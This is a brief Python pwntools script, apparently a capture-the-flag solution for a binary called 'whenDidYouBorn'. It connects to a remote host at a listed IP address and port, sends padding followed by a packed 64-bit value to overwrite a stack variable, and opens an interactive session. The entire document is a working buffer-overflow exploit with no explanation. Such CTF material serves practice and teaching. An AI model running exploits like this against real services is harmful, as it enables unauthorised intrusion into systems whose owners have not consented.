from pwn import *
p = process("./whenDidYouBorn")
p = remote("111.198.29.45", "35456")
p.sendline("1")
p.sendline("2" * 8 + p64(1926))
p.interactive()
